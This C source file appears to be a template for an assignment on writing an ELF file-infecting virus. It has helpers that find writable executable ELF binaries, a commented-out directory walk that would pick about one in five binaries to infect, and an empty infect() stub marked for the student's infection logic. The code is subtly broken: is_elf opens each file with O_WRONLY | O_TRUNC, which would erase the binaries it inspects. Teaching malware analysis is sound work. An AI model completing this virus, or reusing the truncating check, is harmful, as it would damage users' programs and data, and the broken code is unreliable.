#define _XOPEN_SOURCE 500
//#include <stdio.h>
//#include <unistd.h>
//#include <sys/types.h>
//#include <sys/time.h>
//#include <ftw.h>
//#include <string.h>
//#include <stdlib.h>
#include "stdio.h"
#include "stat.h"
#include "elf.h"
#include "syscall.h"
#include "fcntl.h"

#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)

const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

void infect(const char* fpath);

int can_execute(const struct stat *sb, const char* fpath)
{
    return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
        || (sb->st_mode & S_IXOTH);
}

int can_write(const struct stat *sb, const char* fpath)
{
    return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
        || (sb->st_mode & S_IWOTH);
}

int is_elf(const char* fpath)
{
    Elf64_Ehdr header; // Assuming 64-bit ELF file.
    size_t nb;
    int ret = 0;
    //FILE* f;
    int f;

    //f = fopen(fpath, "rb");
    f = open(fpath, O_WRONLY | O_TRUNC);
    //f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
    if (!f) return 0;

    //nb = fread(&header, 1, sizeof(header), f);
    nb = read(f, (char*)&header, sizeof(header));
    if (nb == sizeof(header)) {
        if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
            ret = 1;
        }
    }
    //fclose(f);
    close(f);

    return ret;
}

/*int random_pick()
{
    return rand() % 5 == 0; // We infect roughly 1/5 of the binaries.
}

int file_process(const char *fpath,
                 const struct stat *sb,
                 int flag,
                 struct FTW *s)
{
    int ret = 0;

    if (flag == FTW_F
        && can_execute(sb, fpath)
        && can_write(sb, fpath)
        && is_elf(fpath)
        && random_pick())
    {
        infect(fpath);
    }

    return ret;
}*/

int main(int argc, char* argv[])
{
    /*struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);*/
    write(1, "hello from libc-free world\n", 27);
    return 0;
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
//      The above logic is an example, and you can freely modify it. Note that
//      you should make the above logic work without calling libc functions.
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

// FIXME: your infection logic should be placed here and below.
void infect(const char* fpath)
{
    //printf("%s will be infected.\n", fpath);
}

